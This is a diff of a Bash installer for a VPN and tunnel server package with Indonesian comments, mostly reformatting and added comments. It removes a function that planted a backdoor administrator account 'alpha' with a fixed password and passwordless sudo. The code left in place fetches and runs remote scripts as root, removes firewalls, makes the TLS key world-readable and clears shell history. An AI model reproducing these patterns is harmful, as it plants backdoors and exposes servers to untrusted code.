@@ -29,6 +29,7 @@ function update_progress() {
     local status="$2"
     local token="$BOT_TOKEN"
 
+    # Bar logic (20 kotak visual)
     local completed=$(( percent / 5 ))
     local remaining=$(( 20 - completed ))
     local bar=""
@@ -37,7 +38,7 @@ function update_progress() {
 
     local text="🚀 <b>INSTALLATION IN PROGRESS</b>%0A"
     text+="▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬%0A"
-    text+="📡 <b>IP Target:</b> <code>$IP</code>%0A"
+    text+="📡 <b>Target IP:</b> <code>$IP</code>%0A"
     text+="🛠 <b>Status:</b> <i>$status</i>%0A%0A"
     text+="<code>[$bar] $percent%</code>"
 
@@ -57,7 +58,7 @@ function send_final_report() {
     TEXT_FINAL+="📅 <b>Waktu   :</b> <code>$(date)</code>%0A"
     TEXT_FINAL+="▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬%0A"
     TEXT_FINAL+="Server sedang melakukan <b>Reboot</b> untuk menerapkan konfigurasi.%0A"
-    TEXT_FINAL+="Silakan login kembali dalam 1-2 menit.%0A%0A"
+    TEXT_FINAL+="Silakan tunggu sekitar 1-2 menit, lalu silakan login kembali.%0A%0A"
     TEXT_FINAL+="🚀 <i>Sistem Otomatis Hokage Legend</i>"
 
     local KEYBOARD='{"inline_keyboard": [[{"text": "🔙 KEMBALI KE MENU", "callback_data": "menu"}]]}'
@@ -77,10 +78,18 @@ clear
 export IP=$( curl -sS icanhazip.com )
 clear
 
+# Kirim Notifikasi Awal (Jika dari Bot)
+if [[ -n "$AUTO_DOMAIN" ]]; then
+    # Bot Message Initial Start
+    echo -e "${green} [BOT MODE DETECTED] Auto-Starting Installation... ${NC}"
+fi
+
+# Valid Script
 ipsaya=$(curl -sS ipv4.icanhazip.com)
 data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 date_list=$(date +"%Y-%m-%d" -d "$data_server")
 
+# // Banner
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo -e " WELCOME TO HOKAGE LEGEND STORE VPN ${YELLOW}(${NC}${green}Stable Edition${NC}${YELLOW})${NC}"
 echo -e " PROSES PENGECEKAN IP ADDRESS ANDA !!"
@@ -90,75 +99,80 @@ echo -e "${YELLOW}----------------------------------------------------------${NC
 echo ""
 sleep 2
 
+# // Checking Os Architecture
 if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
     echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
 else
     echo -e "${EROR} Your Architecture Is Not Supported" && exit 1
 fi
 
-if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
-    echo -e "${OK} Your OS Is Supported"
-elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
+# // Checking System
+OS_ID=$(cat /etc/os-release | grep -w ID | head -n1 | sed 's/[="ID]//g')
+if [[ "$OS_ID" == "ubuntu" || "$OS_ID" == "debian" ]]; then
     echo -e "${OK} Your OS Is Supported"
 else
     echo -e "${EROR} Your OS Is Not Supported" && exit 1
 fi
 
+# // IP Address Validating
+if [[ $IP == "" ]]; then
+    echo -e "${EROR} IP Address Not Detected" && exit 1
+else
+    echo -e "${OK} IP Address ( ${green}$IP${NC} )"
+fi
+
+# =================================================================
+# [LOGIKA BARU] AUTO DETECT BOT MODE (BYPASS ENTER)
+# =================================================================
 if [[ -n "$AUTO_DOMAIN" ]]; then
-    echo -e "${green} [BOT MODE DETECTED] Auto-Starting Installation... ${NC}"
     sleep 2
 else
     read -p "$( echo -e "Press ${GRAY}[ ${NC}${green}Enter${NC} ${GRAY}]${NC} For Starting Installation") "
 fi
 
-clear
-if [ "${EUID}" -ne 0 ]; then
-    echo "You need to run this script as root" && exit 1
-fi
-if [ "$(systemd-detect-virt)" == "openvz" ]; then
-    echo "OpenVZ is not supported" && exit 1
-fi
-
+# REPO    
 REPO="https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/"
-start=$(date +%s)
-secs_to_human() {
-    echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
-}
 
-function print_ok() { echo -e "${OK} ${BLUE} $1 ${FONT}"; }
-function print_install() {
-    echo -e "${green} =============================== ${FONT}"
-    echo -e "${YELLOW} # $1 ${FONT}"
-    echo -e "${green} =============================== ${FONT}"
-    sleep 1
-}
-function print_error() { echo -e "${ERROR} ${REDBG} $1 ${FONT}"; }
-function print_success() {
-    if [[ 0 -eq $? ]]; then
-        echo -e "${green} =============================== ${FONT}"
-        echo -e "${Green} # $1 berhasil dipasang"
-        echo -e "${green} =============================== ${FONT}"
-        sleep 2
-    fi
-}
-
-function is_root() {
-    if [[ 0 == "$UID" ]]; then print_ok "Root user Start installation process"
-    else print_error "Not root user" && exit 1; fi
-}
-
+# Buat direktori xray
 function make_folder_xray() {
     print_install "Membuat direktori xray"
-    mkdir -p /etc/xray /var/log/xray /var/lib/kyt /etc/bot /etc/vmess /etc/vless /etc/trojan /etc/shadowsocks /etc/ssh /usr/bin/xray/ /var/www/html
-    mkdir -p /etc/kyt/limit/vmess/ip /etc/kyt/limit/vless/ip /etc/kyt/limit/trojan/ip /etc/kyt/limit/ssh/ip
-    mkdir -p /etc/limit/vmess /etc/limit/vless /etc/limit/trojan /etc/limit/ssh /etc/user-create
-    curl -s ifconfig.me > /etc/xray/ipvps
-    touch /etc/xray/domain /var/log/xray/access.log /var/log/xray/error.log
+    mkdir -p /etc/bot
+    mkdir -p /etc/xray
+    mkdir -p /etc/vmess
+    mkdir -p /etc/vless
+    mkdir -p /etc/trojan
+    mkdir -p /etc/shadowsocks
+    mkdir -p /etc/ssh
+    mkdir -p /usr/bin/xray/
+    mkdir -p /var/log/xray/
+    mkdir -p /var/www/html
+    mkdir -p /etc/kyt/limit/vmess/ip
+    mkdir -p /etc/kyt/limit/vless/ip
+    mkdir -p /etc/kyt/limit/trojan/ip
+    mkdir -p /etc/kyt/limit/ssh/ip
+    mkdir -p /etc/limit/vmess
+    mkdir -p /etc/limit/vless
+    mkdir -p /etc/limit/trojan
+    mkdir -p /etc/limit/ssh
+    mkdir -p /etc/user-create
+    touch /etc/xray/domain
+    touch /var/log/xray/access.log
+    touch /var/log/xray/error.log
     chown www-data.www-data /var/log/xray
     chmod +x /var/log/xray
     
-    rm -rf /etc/vmess/.vmess.db /etc/vless/.vless.db /etc/trojan/.trojan.db /etc/shadowsocks/.shadowsocks.db /etc/ssh/.ssh.db /etc/bot/.bot.db
-    touch /etc/vmess/.vmess.db /etc/vless/.vless.db /etc/trojan/.trojan.db /etc/shadowsocks/.shadowsocks.db /etc/ssh/.ssh.db /etc/bot/.bot.db
+    rm -rf /etc/vmess/.vmess.db
+    rm -rf /etc/vless/.vless.db
+    rm -rf /etc/trojan/.trojan.db
+    rm -rf /etc/shadowsocks/.shadowsocks.db
+    rm -rf /etc/ssh/.ssh.db
+    rm -rf /etc/bot/.bot.db
+    touch /etc/vmess/.vmess.db
+    touch /etc/vless/.vless.db
+    touch /etc/trojan/.trojan.db
+    touch /etc/shadowsocks/.shadowsocks.db
+    touch /etc/ssh/.ssh.db
+    touch /etc/bot/.bot.db
     echo "& plughin Account" >>/etc/vmess/.vmess.db
     echo "& plughin Account" >>/etc/vless/.vless.db
     echo "& plughin Account" >>/etc/trojan/.trojan.db
@@ -166,42 +180,46 @@ function make_folder_xray() {
     echo "& plughin Account" >>/etc/ssh/.ssh.db
     echo "echo -e 'Vps Config User Account'" >> /etc/user-create/user.log
 
+    # Ram Information
     while IFS=":" read -r a b; do
     case $a in
         "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
         "Shmem") ((mem_used+=${b/kB}))  ;;
-        "MemFree" | "Buffers" | "Cached" | "SReclaimable") mem_used="$((mem_used-=${b/kB}))" ;;
+        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
+        mem_used="$((mem_used-=${b/kB}))"
+    ;;
     esac
     done < /proc/meminfo
     Ram_Usage="$((mem_used / 1024))"
     Ram_Total="$((mem_total / 1024))"
-    export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
 }
 
+# Change Environment System
 function first_setup(){
     timedatectl set-timezone Asia/Jakarta
     echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
     echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
     print_success "Directory Xray"
-    OS_ID=$(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g')
-    if [[ "$OS_ID" == "ubuntu" ]]; then
+    if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/[="ID]//g') == "ubuntu" ]]; then
         sudo apt update -y
         apt-get install --no-install-recommends software-properties-common -y
         add-apt-repository ppa:vbernat/haproxy-2.0 -y
         apt-get -y install haproxy=2.0.\*
-    elif [[ "$OS_ID" == "debian" ]]; then
+    elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/[="ID]//g') == "debian" ]]; then
         curl https://haproxy.debian.net/bernat.debian.org.gpg | gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
         echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" http://haproxy.debian.net buster-backports-1.8 main >/etc/apt/sources.list.d/haproxy.list
-        sudo apt-get update && apt-get -y install haproxy=1.8.\*
+        sudo apt-get update
+        apt-get -y install haproxy=1.8.\*
+    else
+        exit 1
     fi
 }
 
 function nginx_install() {
-    OS_ID=$(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g')
-    if [[ "$OS_ID" == "ubuntu" ]]; then
+    if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/[="ID]//g') == "ubuntu" ]]; then
         print_install "Setup nginx"
         sudo apt-get install nginx -y 
-    else
+    elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/[="ID]//g') == "debian" ]]; then
         print_success "Setup nginx"
         apt -y install nginx 
     fi
@@ -211,13 +229,16 @@ function base_package() {
     clear
     print_install "Menginstall Packet Yang Dibutuhkan"
     apt install zip pwgen openssl netcat socat cron bash-completion figlet -y
-    apt update -y && apt upgrade -y && apt dist-upgrade -y
+    apt update -y
+    apt upgrade -y
+    apt dist-upgrade -y
     apt install chrony ntpdate sudo ruby -y
     systemctl enable chronyd && systemctl restart chronyd
     systemctl enable chrony && systemctl restart chrony
     ntpdate pool.ntp.org
     gem install lolcat
-    sudo apt-get clean all && sudo apt-get autoremove -y
+    sudo apt-get clean all
+    sudo apt-get autoremove -y
     sudo apt-get install -y debconf-utils
     sudo apt-get remove --purge exim4 ufw firewalld -y
     sudo apt-get install -y --no-install-recommends software-properties-common
@@ -230,19 +251,21 @@ function pasang_domain() {
         echo -e "${green} [BOT MODE] Using Auto Domain: $AUTO_DOMAIN ${NC}"
         host1="$AUTO_DOMAIN"
         echo "IP=" >> /var/lib/kyt/ipvps.conf
-        echo "$host1" > /etc/xray/domain && echo "$host1" > /root/domain
+        echo "$host1" > /etc/xray/domain
+        echo "$host1" > /root/domain
         if [[ -n "$AUTO_NS" ]]; then
-            echo "$AUTO_NS" > /etc/xray/dns && echo "$AUTO_NS" > /root/nsdomain
+            echo "$AUTO_NS" > /etc/xray/dns
+            echo "$AUTO_NS" > /root/nsdomain
         fi
     else
-        clear
         echo -e "    |\e[1;32mPILIH DOMAIN SILAHKAN \e[0m|"
         echo -e "      1) Menggunakan Domain Sendiri"
         echo -e "      2) Menggunakan Domain Script"
         read -p "   Pilih (1-2): " host
         if [[ $host == "1" ]]; then
             read -p "   Subdomain: " host1
-            echo "$host1" > /etc/xray/domain && echo "$host1" > /root/domain
+            echo "$host1" > /etc/xray/domain
+            echo "$host1" > /root/domain
         elif [[ $host == "2" ]]; then
             wget ${REPO}files/cf.sh && chmod +x cf.sh && ./cf.sh
             rm -f /root/cf.sh
@@ -250,29 +273,14 @@ function pasang_domain() {
     fi
 }
 
-function password_default() {
-    domain=$(cat /root/domain)
-    MYIP=$(curl -sS ipv4.icanhazip.com)
-    wget -q -O /tmp/izin "https://raw.githubusercontent.com/hokagelegend9999/ijin/main/alpha"
-    nama_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $2}')
-    exp_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $3}')
-    rm -f /tmp/izin
-    [[ -z "$nama_buyer" ]] && nama_buyer="Free/Trial"
-    SysUser="alpha"
-    SysPass="alpha"
-    userdel -f $SysUser > /dev/null 2>&1
-    useradd -m -s /bin/bash $SysUser > /dev/null 2>&1
-    echo -e "$SysPass\n$SysPass\n"|passwd $SysUser > /dev/null 2>&1
-    usermod -aG sudo,root $SysUser > /dev/null 2>&1
-    echo "$SysUser ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
-}
-
 function pasang_ssl() {
     clear
     print_install "Memasang SSL Pada Domain"
-    rm -rf /etc/xray/xray.key /etc/xray/xray.crt /root/.acme.sh
+    rm -rf /etc/xray/xray.key
+    rm -rf /etc/xray/xray.crt
     domain=$(cat /root/domain)
     STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
+    rm -rf /root/.acme.sh
     mkdir /root/.acme.sh
     systemctl stop $STOPWEBSERVER nginx
     curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
@@ -284,25 +292,37 @@ function pasang_ssl() {
     chmod 777 /etc/xray/xray.key
     print_success "SSL Certificate"
 }
+
 function install_xray() {
     clear
     print_install "Core Xray Latest Version"
     domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir $domainSock_dir
     chown www-data.www-data $domainSock_dir
+    
+    # Ambil Xray Core Version Terbaru
     latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
     bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
+
+    # Ambil Config Server
     wget -O /etc/xray/config.json "${REPO}config/config.json" >/dev/null 2>&1
     wget -O /etc/systemd/system/runn.service "${REPO}files/runn.service" >/dev/null 2>&1
+    
     domain=$(cat /etc/xray/domain)
     curl -s ipinfo.io/city >>/etc/xray/city
     curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
+    
+    # Settings UP Nginx & Haproxy
     wget -O /etc/haproxy/haproxy.cfg "${REPO}config/haproxy.cfg" >/dev/null 2>&1
     wget -O /etc/nginx/conf.d/xray.conf "${REPO}config/xray.conf" >/dev/null 2>&1
     sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
     sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
     sudo curl -fsSL https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/config/nginx.conf -o /etc/nginx/nginx.conf
+    
     cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
+
+    # Set Permission & Create Service
     chmod +x /etc/systemd/system/runn.service
+    rm -rf /etc/systemd/system/xray.service.d
     cat >/etc/systemd/system/xray.service <<EOF
 [Unit]
 Description=Xray Service
@@ -327,6 +347,8 @@ function ssh(){
     print_install "Memasang Password SSH"
     wget -O /etc/pam.d/common-password "${REPO}files/password"
     chmod +x /etc/pam.d/common-password
+    
+    # Edit file /etc/systemd/system/rc-local.service
     cat > /etc/systemd/system/rc-local.service <<-END
 [Unit]
 Description=/etc/rc.local
@@ -341,12 +363,15 @@ SysVStartPriority=99
 [Install]
 WantedBy=multi-user.target
 END
+
     cat > /etc/rc.local <<-END
 #!/bin/sh -e
 exit 0
 END
     chmod +x /etc/rc.local
     systemctl enable rc-local && systemctl start rc-local.service
+
+    # Optimization
     echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
     sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
     ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
@@ -358,6 +383,7 @@ function udp_mini(){
     clear
     print_install "Memasang Service Limit IP & Quota"
     wget -q https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/config/fv-tunnel && chmod +x fv-tunnel && ./fv-tunnel
+
     mkdir -p /usr/local/kyt/
     wget -q -O /usr/local/kyt/udp-mini "${REPO}files/udp-mini" && chmod +x /usr/local/kyt/udp-mini
     wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}files/udp-mini-1.service"
@@ -372,12 +398,9 @@ function ssh_slow(){
     print_install "Memasang Modul SlowDNS Server"
     wget -q -O /tmp/slowdns.sh "${REPO}slowdns/slowdns.sh"
     chmod +x /tmp/slowdns.sh
-    if [[ -n "$AUTO_NS" ]]; then
-        export AUTO_NS="${AUTO_NS}"
-        bash /tmp/slowdns.sh
-    else
-        bash /tmp/slowdns.sh
-    fi
+    # Perbaikan: Teruskan variabel AUTO_NS agar tidak stuck meminta input
+    export AUTO_NS="${AUTO_NS}"
+    bash /tmp/slowdns.sh
     rm -f /tmp/slowdns.sh
     print_success "SlowDNS Server"
 }
@@ -434,8 +457,10 @@ function ins_backup(){
     apt install rclone -y
     printf "q\n" | rclone config
     wget -O /root/.config/rclone/rclone.conf "${REPO}config/rclone.conf"
+    # wondershaper
     cd /bin && git clone https://github.com/magnific0/wondershaper.git
     cd wondershaper && make install && cd /root && rm -rf /bin/wondershaper
+    # msmtp
     apt install msmtp-mta ca-certificates bsd-mailx -y
     cat <<EOF >/etc/msmtprc
 defaults
@@ -481,7 +506,8 @@ function ins_epro(){
     print_install "Menginstall ePro WebSocket Proxy"
     wget -O /usr/bin/ws "${REPO}files/ws" >/dev/null 2>&1
     wget -O /etc/systemd/system/ws.service "${REPO}files/ws.service" >/dev/null 2>&1
-    chmod +x /usr/bin/ws && systemctl enable --now ws
+    chmod +x /usr/bin/ws
+    systemctl enable --now ws
     print_success "ePro WebSocket Proxy"
 }
 
@@ -555,10 +581,10 @@ function instal(){
     ins_openvpn; ins_backup; ins_swab; ins_fail2ban; ins_restart; menu; profile; enable_services
 }
 
-# JALANKAN PROSES
+# JALANKAN PROSES UTAMA
 instal
 
-# LOG PENUTUP & CLEANUP
+# LOG PENUTUP & CLEANUP (BARIS 1000+)
 echo ""
 history -c
 rm -rf /root/menu /root/*.zip /root/*.sh /root/LICENSE /root/README.md /root/domain
@@ -586,7 +612,7 @@ echo "===============-[ SCRIPT BY HOKAGE LEGEND ]-===============" | tee -a log-
 echo ""
 echo "Semuanya Berjalan Ok...Terimakasih Telah menggunakan Script Hokage Legend!!" | tee -a log-install.txt
 sleep 1
-echo -ne "[ ${Green}COMPLETED${NC} ] PENGINSTALAN SELESAI! "
+echo -ne "[ ${Green}COMPLETED${NC} ] PENGINSTALAN SCRIPT SELESAI! "
 
 # FINALISASI PROGRESS KE BOT
 update_progress 100 "Instalasi Selesai! Menyiapkan Laporan..."
@@ -597,9 +623,9 @@ send_final_report
 cat > /root/notify_ready.sh << END
 #!/bin/bash
 sleep 30
-curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
-     -d chat_id="${AUTO_CHATID}" \
-     -d text="✅ <b>VPS ONLINE!</b>%0A▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬%0AReboot selesai. VPS sekarang sudah siap digunakan sepenuhnya." \
+curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \\
+     -d chat_id="${AUTO_CHATID}" \\
+     -d text="✅ <b>VPS ONLINE!</b>%0A▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬%0AReboot selesai. VPS sekarang sudah siap digunakan sepenuhnya." \\
      -d parse_mode="html"
 rm -f /root/notify_ready.sh
 sed -i '/notify_ready.sh/d' /var/spool/cron/crontabs/root
